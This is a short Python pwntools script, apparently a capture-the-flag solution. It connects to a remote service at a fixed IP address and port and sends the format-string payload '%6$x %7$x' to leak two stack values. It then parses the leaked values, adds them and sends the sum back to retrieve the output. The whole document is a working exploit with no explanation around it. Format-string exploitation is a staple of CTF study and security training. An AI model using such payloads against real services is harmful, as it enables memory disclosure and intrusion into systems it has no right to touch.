from pwn import *


io = remote('128.199.234.122', 4200)

print(io.recv())
io.sendline('%6$x %7$x')
print(io.recv())
a = io.recv().split()
num1 = int(a[0], 16)
num2 = int(a[1], 16)
io.sendline(str(num1+num2))
print(io.recvall())
